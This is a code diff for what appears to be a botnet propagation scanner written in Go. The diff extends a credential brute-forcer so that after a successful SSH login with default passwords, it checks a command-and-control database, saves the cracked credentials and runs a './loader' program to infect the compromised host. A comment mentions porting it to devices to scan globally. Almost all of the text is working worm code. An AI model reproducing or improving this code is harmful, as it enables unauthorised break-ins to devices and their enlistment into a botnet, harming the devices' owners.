@@ -12,8 +12,9 @@ import (
 
 var (
 	MAlist = [][]string{
-		{"admin", "password"},
 		{"root", "password"},
+		{"admin", "password"},
+
 		{"admin", "admin"},
 		{"root", "admin"},
         {"root", "888888"},
@@ -125,9 +126,9 @@ func isTelnetOpen(ip string,port string) {
 							writetolocal(user+":"+password)
 						}
 						go func(){
-							fmt.Println("Success Execute this file")
 							cmd:=exec.Command("./loader" , user , password , ip , port)
 							cmd.Run()
+							fmt.Println("Success Execute this file")
 						}()
 						return 
 					}
@@ -159,12 +160,17 @@ func isTelnetOpen(ip string,port string) {
 
 func isSSHOpen(ip string) {
 	pindex := 0
-	retryTwoTimes := false
+	retryTwoTimes1 := false
+	retryTwoTimes2 := false
 	for {
 		username, password := getCredentials(pindex)
 		pindex++
+		if pindex>=len(MAlist){
+			break
+		}
 		config := &ssh.ClientConfig{
 			User: username,
+			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 			Auth: []ssh.AuthMethod{
 				ssh.Password(password),
 			},
@@ -174,21 +180,37 @@ func isSSHOpen(ip string) {
 		if err == nil {
 			defer client.Close()
 			fmt.Printf("[Scanner] Found combo:\n\tHOSTNAME: %s\n\tUSERNAME: %s\n\tPASSWORD: %s\n", ip, username, password)
+			if validateC2(ip,"22"){
+				if c2crd(username,password,ip,"22")==true{ //如果存在在DB 不再做二次感染
+					return
+				}
+			}else{
+				writetolocal(username+":"+password)
+			}
+			go func(){
+				cmd:=exec.Command("./loader" , username , password , ip , "22")
+				cmd.Run()
+				fmt.Println("Success Execute this file")
+			}()
 			return
 		} else if strings.Contains(err.Error(), "quota exceeded") {
 			fmt.Println("[Scanner] Quota exceeded, retrying with delay...")
 			time.Sleep(60 * time.Second)
-			if retryTwoTimes {
+			if retryTwoTimes1 {
 				return
 			}
-			retryTwoTimes = true
+			retryTwoTimes1 = true
 			continue
-		} else if strings.Contains(err.Error(), "connection refused") {
+		} else if strings.Contains(err.Error(), "connection refused") { //連接失敗
 			fmt.Printf("[Scanner] Host: %s is unreachable\n", ip)
-			return
+			time.Sleep(60 * time.Second)
+			if retryTwoTimes2{
+				return
+			}
+			retryTwoTimes2 = true
+			continue
 		} else if strings.Contains(err.Error(), "unable to authenticate") {
-			fmt.Printf("[Scanner] Invalid credentials for %s:%s\n", username, password)
-			return
+			fmt.Printf("[Scanner] Invalid credentials for %s : %s\n", username, password)
 		}
 	}
 }
@@ -250,7 +272,6 @@ func validateC2(ip string,port string )bool {
 		fmt.Println("-----------------------------------")
 		time.Sleep(__C2DELAY__)
 	}
-	return false
 }
 
 func c2crd(usr string, psw string, ip string, port string) bool {
@@ -338,8 +359,9 @@ func intToString(num int) string {
 
 func main() {
 	fmt.Println("[Scanner] Scanner process started ..")
-	//isSSHOpen("192.168.1.163")
-	isTelnetOpen("192.168.1.163","23")
+	isSSHOpen("192.168.1.163")
+	
+	//isTelnetOpen("192.168.1.163","23")
 	
 	//Scanner() //若移植到裝置上掃描全域
 
